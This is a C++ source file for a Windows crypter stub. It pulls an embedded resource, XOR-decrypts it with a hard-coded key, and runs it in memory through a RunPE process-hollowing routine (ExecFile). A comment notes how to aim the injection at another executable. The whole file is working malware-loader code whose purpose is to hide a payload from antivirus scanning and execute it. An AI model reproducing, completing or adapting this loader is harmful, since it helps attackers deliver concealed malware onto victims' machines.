#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <vector>
#include <string>
using namespace std;


int Rsize;
//char* RData;


//void Resource(int id)
//{
//	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
//	HGLOBAL temp = LoadResource(NULL, hResource);
//	Rsize = SizeofResource(NULL, hResource);
//	RData = (char*)LockResource(temp);
//}


//void enc()
//{
//	switch (RData[strlen(RData) - 1])
//	{
//	case '1':
//		{
//			}
//		break;
//	case '2':
//		{
//			string cipher = "penguin";
//			for (unsigned x = 0; x < Rsize; x++)           // Steps through the characters of the string.
//				RData[x] ^= cipher[x % cipher.size()];
//			//for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//
//			//	char cipher[] = "penguin";
//			//ofstream out("Stub Output.txt");
//			//	for (int i = 0; i < Rsize; i++)       
//			//	{
//			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
//			//	}
//			}												// Simple Xor chiper
//		break;
//	case '3':
//		{	std::ofstream out("3.txt");
//		out << strlen(RData) - 1;
//		char cipher[] = "test";
//		unsigned short pl = strlen(cipher);
//		char passTable[1024];
//		for (int i = 0; i != 1024; ++i)
//			passTable[i] = cipher[i%pl];
//
//		for (unsigned long long i = 0; i != Rsize; i += 2)
//		{
//			out << RData[i];
//			RData[i] ^= passTable[i % 1024];
//		}
//
//			}
//		break;
//	}
//	return;
//}


std::vector<char> RData;

void Resource(int id)
{
	size_t Rsize;

	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData.resize(Rsize);
	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];
}



void enc()
{
	switch (RData.back())
	{
	case '1':
		{
			std::ofstream out("1.txt");
		}
		break;
	case '2':
		{
			xor_crypt("penguin", RData);
		}
		break;
	}
	return;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	Resource(10);
	enc();

	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData.data();
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};